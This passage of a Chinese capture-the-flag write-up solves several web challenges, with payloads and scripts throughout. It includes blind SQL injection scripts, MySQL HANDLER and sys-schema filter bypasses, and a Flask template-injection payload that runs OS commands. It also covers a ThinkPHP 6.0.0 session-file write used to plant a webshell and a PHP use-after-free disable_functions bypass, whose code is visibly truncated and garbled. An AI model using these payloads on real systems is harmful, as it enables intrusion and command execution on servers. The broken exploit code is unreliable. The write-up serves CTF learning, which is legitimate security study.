    for j in range(1,100):
        print j
        for i in range(32,128):
            # sql = 'select if((ascii(substr(database(),'+str(j)+',1))>'+str(i)+'),1,sleep(100))'
            #payload="select if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),"+str(j)+",1))="+str(i)+"),sleep(4),1)"
                    #print(payload)
                    #payload="select if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='table1'),"+str(j)+",1))="+str(i)+"),sleep(4),1)"
            sql = "select if((ascii(substr((select group_concat(fllllll4g) from table1),"+str(j)+",1))="+str(i)+"),sleep(4),1)"
            # print sql
            hex_sql = str_to_hex(sql)
            url_1 = url+hex_sql+';prepare%20a%20from%20@x;execute%20a;'
            # print url_1
            # exit()
            try:
                res = requests.get(url_1,timeout=4)
            except requests.exceptions.ReadTimeout:
                flag +=chr(i)
                print flag
                break
###  blacklist
打开题目发现和强网杯的一道题目特别相似。
但是这个题目的过滤更加严谨：  
将上次强网杯那道题的思路都给过滤了。。
    return preg_match("/set|prepare|alter|rename|select|update|delete|drop|insert|where|./i",$inject);
我们可以查到表名 payload:`-1';show tables;`：
我们可以发现`flag`所在的表
通过查阅资料，发现了一个有趣的东西 `handler` [Mysql查询语句-handler](https://blog.csdn.net/JesseYoung/article/details/40785137)
`handler`的使用方法：
    mysql> handler user open;
    Query OK, 0 rows affected (0.00 sec)
    mysql> handler user read first;
    +----+-------+-------+
    | id | name  | pass  |
    +----+-------+-------+
    |  1 | admin | admin |
    +----+-------+-------+
    1 row in set (0.00 sec)
    mysql> handler user read next;
    +----+------+------+
    | id | name | pass |
    +----+------+------+
    |  2 | root | root |
    +----+------+------+
    1 row in set (0.00 sec)
    mysql> handler user close;
    Query OK, 0 rows affected (0.00 sec)
我们可以如法炮制一下。
得到payload:
    -1';handler `FlagHere` open;handler `FlagHere` read first;#
###  Ezsqli
打开题目
发现 输入`1` 回显 `Hello Nu1L`
输入`2` 回显`Hello CQGAME`
当我们输入 `2-1` 回显 `Hello Nu1L`
发现存在注入点。`2-(ascii(substr(database(),1,1))>1)`这样可以探测到数据库名。
这其中也过滤了一些字符串
    sleep,instr,benchmark,format,insert,bin,substring,ord,and,in,or,xor
其中`union`和`select`单独使用不会被过滤，一起使用会被判定非法字符。。。
由于过滤了`in`，我们就无法使用`information_schema`这个库来查询我们想要的表名和字段名了。
我们需要了解一下MySQL5.7的新特性
    由于performance_schema过于发杂，所以mysql在5.7版本中新增了sys schemma，基础数据来自于performance_chema和information_schema两个库，本身数据库不存储数据。
我也找到了一篇文章[bypass information_schema](https://www.anquanke.com/post/id/193512)
通过文章上说讲我们可以通过`sys.schema_table_statistics_with_buffer`来查询表名。  
构造payload:
    2-(ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()),1,1))>1)
这样我们就可以构造出来表名`f1ag_1s_h3r3_hhhhh`。
在我们知道表名的情况下，原来的想法是可以进行无列明注入的，但是过滤了`union select` `join`等 弄得很难受
尝试之间发现：  
`2 - (ascii(substr((select count(*) f1ag_1s_h3r3_hhhhh),1,1))=49)`
可以得到表中只有一条数据
`2 - (ascii(substr((select count(id) f1ag_1s_h3r3_hhhhh),1,1))=49)`
可以的得到表存在`id`值为`1`
在尝试中，发现了一个骚姿势：
    mysql> select (select 1,0x01,3)>(select * from user limit 1);
    +------------------------------------------------+
    | (select 1,0x01,3)>(select * from user limit 1) |
    +------------------------------------------------+
    |                                              0 |
    +------------------------------------------------+
    1 row in set (0.00 sec)
    mysql> select (select 1,0xff,3)>(select * from user limit 1);
    +------------------------------------------------+
    | (select 1,0xff,3)>(select * from user limit 1) |
    +------------------------------------------------+
    |                                              1 |
    +------------------------------------------------+
    1 row in set (0.00 sec)
于是可以尝试得到flag:  
payload:
    2-(select (select 1,0x01)>(select * from f1ag_1s_h3r3_hhhhh limit 1))
最后附上脚本：
    import requests
    def str_to_hex(s):
        return ''.join([hex(ord(c)).replace('0x', '') for c in s])
    url = "http://86ad8e55dd3244b488826b4cf0924ce4b5a885066be143a0.changame.ichunqiu.com/index.php"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    flag=''
    for j in range(1,100):
        for i in range(32,126):
            print i
            payload = "id=2-(ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()),"+str(j)+",1))(select * from f1ag_1s_h3r3_hhhhh limit 1))"
            res = requests.post(url=url,data=payload,headers=headers)
            # print payload
            # print res.text
            # exit()
            if "Hello Nu1L" in res.text:
                    flag += chr(i-1)
                    print flag
                    break
## DAY3
###  Flaskapp
这是一个base64的加密解密网站
猜测试ssti
`${{1+1}}`将其base64编码 然后再网站上用解密工具解码得到：
发现有回显，然后就试构造payload:执行命令了。。
这里面也有一些过滤，当输入的存在非法字符时，
得到payload:`{{{}.__class__.__base__.__subclasses__()[103].__init__.__globals__['__builtins__']['ev'+'al']("__imp"+"ort_"+"_('o"+"s').po"+"pen('ls').read()")}}`
能够执行命令：
读`flag`文件:
`{{{}.__class__.__base__.__subclasses__()[103].__init__.__globals__['__builtins__']['ev'+'al']("__imp"+"ort_"+"_('o"+"s').po"+"pen('cat
this_is_the_fl'+'ag.txt').read()")}}`
###  easy_thinking
打开题目：
发现存在源码`www.zip`，通过测试发现：
是个`thinkphp6.0.0`这个版本前一段刚爆出来了一个漏洞[参考链接](https://paper.seebug.org/1114/)，探测一波。
我们正常的注册，登陆，发现页面存在查找功能，但是什么也查不到。。。
在`http://123.57.212.112:7892/runtime/session/`这个目录下，我们找到了存放`session`的文件。
打开对应的文件，发现里面存储的时我们刚刚查找的内容。
于是我们可以上传一个木马文件。
在我们登陆时，修改一下`PHPSESSID`的值，改成`102cf8246d140a73584c0e6c02b8.php`，登陆成功之后就会在`http://123.57.212.112:7892/runtime/session/`这个目录下，找到这个文件，然后就是写马进去。
访问这个文件，发现成功写入木马：
但是执行不了系统命令。。。因为`disable_functions`
这个禁止使用的太多了`mail,error_log`这些也被禁用了，只好拿出祖传的神器了。。。
    = 0; $j--) {
                $address >= 8;
            }
            return $out;
        }
        function write(&$str, $p, $v, $n = 8) {
            $i = 0;
            for($i = 0; $i >= 8;
            }
        }
        function leak($addr, $p = 0, $s = 8) {
            global $abc, $helper;
            write($abc, 0x68, $addr + $p - 0x10);
            $leak = strlen($helper->a);
            if($s != 8) { $leak %= 2  0 && $leak - $base  0 && $leak - $base chtg = $this->ryat;
                $this->ryat = 1;
            }
        }
        class Helper {
            public $a, $b, $c, $d;
        }
        if(stristr(PHP_OS, 'WIN')) {
            die('This PoC is for *nix systems only.');
        }
        $n_alloc = 10; # increase this value if you get segfaults
        $contiguous = [];
        for($i = 0; $i b = function ($x) { };
        if(strlen($abc) == 79 || strlen($abc) == 0) {
            die("UAF failed");
        }
        # leaks
        $closure_handlers = str2ptr($abc, 0);
        $php_heap = str2ptr($abc, 0x58);
        $abc_addr = $php_heap - 0xc8;
        # fake value
        write($abc, 0x60, 2);
        write($abc, 0x70, 6);
        # fake reference
        write($abc, 0x10, $abc_addr + 0x60);
        write($abc, 0x18, 0xa);
        $closure_obj = str2ptr($abc, 0x20);
        $binary_leak = leak($closure_handlers, 8);
        if(!($base = get_binary_base($binary_leak))) {
            die("Couldn't determine binary base address");
        }
        if(!($elf = parse_elf($base))) {
            die("Couldn't parse ELF header");
        }
        if(!($basic_funcs = get_basic_funcs($base, $elf))) {
            die("Couldn't get basic_functions address");
        }
        if(!($zif_system = get_system($basic_funcs))) {
            die("Couldn't get zif_system address");
        }
        # fake closure object
        $fake_obj_offset = 0xd0;
        for($i = 0; $i b)($cmd);
        exit();
    }
    ?>
将这个上传到服务器，就能执行命令了，访问就得到了`flag`。
    flag{4424232f-959f-4923-b693-cd9b3e7e316f}